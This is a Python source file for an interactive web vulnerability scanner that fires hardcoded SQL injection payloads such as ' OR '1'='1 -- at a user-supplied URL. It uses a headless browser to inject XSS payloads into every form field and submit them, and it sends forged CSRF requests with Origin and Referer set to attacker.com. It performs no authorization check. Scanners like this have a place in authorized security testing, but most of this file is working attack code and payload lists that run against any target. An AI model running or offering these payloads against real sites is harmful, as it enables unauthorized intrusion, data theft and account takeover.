import json
import requests
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from colorama import Fore, Style, init
from urllib.parse import urlparse
import concurrent.futures
from colorama import Fore, Style
from selenium.webdriver.common.action_chains import ActionChains
import time
# Initialize colorama
init(autoreset=True)

# ASCII Art Banner
BANNER = f"""
{Fore.CYAN}
▓███▒ ▓▒ ▓▓▀ ▓█████ ▓· ▓▌ ▓███· ▓███▌      ▓███       
▓▓▄· ▓▌▄▒▓▓▓▓ ▓▓▓▓  ▒▓▓▓▄ ▓▓▄▄▄ ▓▄▄▓▌  ▒▓▓▄ ▄▄      
▒▓▌▄▐▌▒▓▌▄▄▒ ▒▒▄▄▄▄  ▒▓▌▄▄▄▌ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▌ ▒▓▀▀▀▀▄ 
 ▀▀▀▀ ▀▀▀▀▀▀  ▀▀▀▀▀  ▀▀▀▀▀  ▀▀▀▀▀ ▀▀▀▀  ▀▀▀  ▀▀▀▀▀▀ 
{Style.RESET_ALL}
{Fore.YELLOW}Interactive Web Vulnerability Scanner v4.0{Style.RESET_ALL}
{Fore.MAGENTA}Now with CSRF Testing{Style.RESET_ALL}
"""

def print_banner():
    print(BANNER)

def get_user_input():
    """Get all required inputs through interactive prompts"""
    inputs = {}
    
    print(f"\n{Fore.YELLOW}[+] Target Information{Style.RESET_ALL}")
    while True:
        inputs['url'] = input(f"{Fore.CYAN}› Enter target URL (e.g., http://example.com/login.php): {Style.RESET_ALL}").strip()
        if validate_url(inputs['url']):
            break
        print(f"{Fore.RED}Invalid URL format! Must include http/https{Style.RESET_ALL}")

    print(f"\n{Fore.YELLOW}[+] Scan Configuration{Style.RESET_ALL}")
    inputs['method'] = input(f"{Fore.CYAN}› HTTP Method [GET/POST] (default: GET): {Style.RESET_ALL}").strip().upper() or "GET"
    inputs['xss'] = input(f"{Fore.CYAN}› Perform XSS test? [y/N]: {Style.RESET_ALL}").strip().lower() == 'y'
    inputs['csrf'] = input(f"{Fore.CYAN}› Perform CSRF test? [y/N]: {Style.RESET_ALL}").strip().lower() == 'y'

    print(f"\n{Fore.YELLOW}[+] Request Parameters{Style.RESET_ALL}")
    while True:
        param_input = input(f"{Fore.CYAN}› Enter parameters as JSON (e.g., {{\"user\": \"admin\"}}): {Style.RESET_ALL}").strip()
        if not param_input:
            param_input = '{}'
        try:
            inputs['params'] = json.loads(param_input)
            break
        except json.JSONDecodeError:
            print(f"{Fore.RED}Invalid JSON! Example valid format: {{\"username\": \"admin\"}}{Style.RESET_ALL}")

    return inputs

def validate_url(url):
    """Validate URL format"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def test_sql_injection(url, method, params):
    print(f"\n{Fore.YELLOW}[➤] Starting SQL Injection Test{Style.RESET_ALL}")
    print(f"{Fore.WHITE}› Target: {url}\n› Method: {method}\n› Parameters: {params}{Style.RESET_ALL}")

    def test_payload(payload):
        try:
            injected_params = {k: f"{v}{payload}" for k, v in params.items()}
            start_time = time.time()
            
            with requests.Session() as session:
                if method.upper() == "GET":
                    response = session.get(url, params=injected_params, timeout=15)
                else:
                    response = session.post(url, data=injected_params, timeout=15)
                
                response_time = time.time() - start_time
                content = response.text.lower()

                indicators = {
                    'error-based': ['error', 'warning', 'exception', 'syntax'],
                    'time-based': response_time > 4,
                    'status-code': response.status_code != 200
                }

                for vuln_type, condition in indicators.items():
                    if (vuln_type == 'error-based' and any(indicator in content for indicator in condition)) or \
                       (vuln_type == 'time-based' and condition) or \
                       (vuln_type == 'status-code' and condition):
                        return (True, vuln_type, payload, response_time)

            return (False, None, payload, response_time)
        
        except Exception as e:
            return (False, f"Error: {str(e)}", payload, 0)

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        SQL_PAYLOADS = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' ({",
            "' OR '1'='1' /*",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 'a'='a",
            "' OR 'a'='a' --",
            "' OR 'a'='a' ({",
            "' OR 'a'='a' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "admin' or '1'='1",
            "admin' or '1'='1' --",
            "admin' or '1'='1' ({",
            "admin' or '1'='1' /*"
        ]
        
        futures = [executor.submit(test_payload, payload) for payload in SQL_PAYLOADS]
        
        for future in concurrent.futures.as_completed(futures):
            result, vuln_type, payload, response_time = future.result()
            if result:
                print(f"{Fore.GREEN}[✓] {vuln_type.upper()} Vulnerability Detected!{Style.RESET_ALL}")
                print(f"{Fore.WHITE}Payload: {payload}{Style.RESET_ALL}")
                if vuln_type == 'time-based':
                    print(f"Response Time: {response_time:.2f}s\n")
            else:
                print(f"{Fore.RED}[✗] Tested: {payload}{Style.RESET_ALL}")

# List of XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "<iframe src=javascript:alert('XSS')>",
    "javascript:alert('XSS')",
    "document.write('<img src=x onerror=alert(1)>');",
    "<a href='javascript:alert(1)'>Click Me</a>",
    "%3Cscript%3Ealert(1)%3C/script%3E"
]

def test_xss(target_url):
    print(f"\n{Fore.YELLOW}[➤] Starting XSS Test{Style.RESET_ALL}")

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')

    try:
        with webdriver.Chrome(options=options) as driver:
            driver.get(target_url)
            print(f"{Fore.WHITE}› Testing URL: {target_url}{Style.RESET_ALL}")

            for idx, payload in enumerate(XSS_PAYLOADS, 1):
                print(f"{Fore.CYAN}[•] Testing payload {idx}/{len(XSS_PAYLOADS)}{Style.RESET_ALL}")

                try:
                    inputs = driver.find_elements(By.TAG_NAME, 'input')
                    textareas = driver.find_elements(By.TAG_NAME, 'textarea')

                    for element in inputs + textareas:
                        element.clear()
                        element.send_keys(payload)

                    forms = driver.find_elements(By.TAG_NAME, 'form')
                    for form in forms:
                        form.submit()
                        time.sleep(1.5)  # Wait for the page to process input

                        # Step 1: Check if payload appears in page source
                        if payload in driver.page_source:
                            print(f"{Fore.GREEN}[✓] XSS Detected via reflection!{Style.RESET_ALL}")
                            print(f"{Fore.WHITE}Payload: {payload}{Style.RESET_ALL}")
                            return

                        # Step 2: Try triggering event-based XSS
                        for element in inputs + textareas:
                            try:
                                ActionChains(driver).move_to_element(element).click().perform()
                            except:
                                continue

                        # Step 3: Detect alerts triggered
                        try:
                            alert = driver.switch_to.alert
                            if alert.text:
                                print(f"{Fore.GREEN}[✓] XSS Detected via alert!{Style.RESET_ALL}")
                                print(f"{Fore.WHITE}Payload: {payload}{Style.RESET_ALL}")
                                alert.accept()
                                return
                        except:
                            pass

                    # Reload the page after each test
                    driver.get(target_url)

                except Exception as e:
                    continue

            print(f"{Fore.RED}[✗] No XSS vulnerabilities found{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[!] XSS Test Failed: {str(e)}{Style.RESET_ALL}")


def test_csrf(target_url):
    print(f"\n{Fore.YELLOW}[➤] Starting CSRF Test{Style.RESET_ALL}")

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    
    try:
        with webdriver.Chrome(options=options) as driver:
            driver.get(target_url)
            print(f"{Fore.WHITE}› Testing URL: {target_url}{Style.RESET_ALL}")

            forms = driver.find_elements(By.TAG_NAME, 'form')
            if not forms:
                print(f"{Fore.RED}[✗] No forms found for CSRF testing{Style.RESET_ALL}")
                return

            vulnerable = False

            for index, form in enumerate(forms, 1):
                print(f"{Fore.CYAN}[•] Analyzing form {index}/{len(forms)}{Style.RESET_ALL}")

                # Find CSRF tokens in hidden fields
                csrf_fields = form.find_elements(By.CSS_SELECTOR, 
                    'input[name*="csrf"], input[name*="token"], input[type="hidden"]')

                action_url = form.get_attribute('action') or target_url
                method = form.get_attribute('method') or "GET"

                inputs = form.find_elements(By.TAG_NAME, 'input')
                params = {inp.get_attribute('name'): "test_value" for inp in inputs if inp.get_attribute('name')}

                # Step 1: Identify missing CSRF tokens
                if not csrf_fields:
                    print(f"{Fore.GREEN}[✓] Potential CSRF: No CSRF protection detected{Style.RESET_ALL}")
                    vulnerable = True

                    # Step 2: Attempt CSRF Attack
                    csrf_attack(action_url, method, params)

            if not vulnerable:
                print(f"{Fore.RED}[✗] No CSRF vulnerabilities detected{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[!] CSRF Test Failed: {str(e)}{Style.RESET_ALL}")

def csrf_attack(url, method, params):
    """
    Simulates a CSRF attack by sending a forged request.
    """
    print(f"{Fore.YELLOW}[➤] Attempting CSRF attack on {url}{Style.RESET_ALL}")

    headers = {
        "Referer": "https://attacker.com",
        "Origin": "https://attacker.com"
    }

    try:
        if method.upper() == "POST":
            response = requests.post(url, data=params, headers=headers)
        else:
            response = requests.get(url, params=params, headers=headers)

        if response.status_code in [200, 302]:
            print(f"{Fore.GREEN}[✓] CSRF Attack Successful! Target might be vulnerable.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] CSRF Attack Failed. Target is protected.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[!] Error during CSRF attack: {str(e)}{Style.RESET_ALL}")

def main():
    print_banner()
    config = get_user_input()
    
    start_time = time.time()
    
    # Run security tests
    test_sql_injection(config['url'], config['method'], config['params'])
    
    if config['xss']:
        test_xss(config['url'])
        
    if config['csrf']:
        test_csrf(config['url'])

    print(f"\n{Fore.CYAN}[✓] Scan completed in {time.time()-start_time:.2f} seconds{Style.RESET_ALL}")

if __name__ == "__main__":
    main()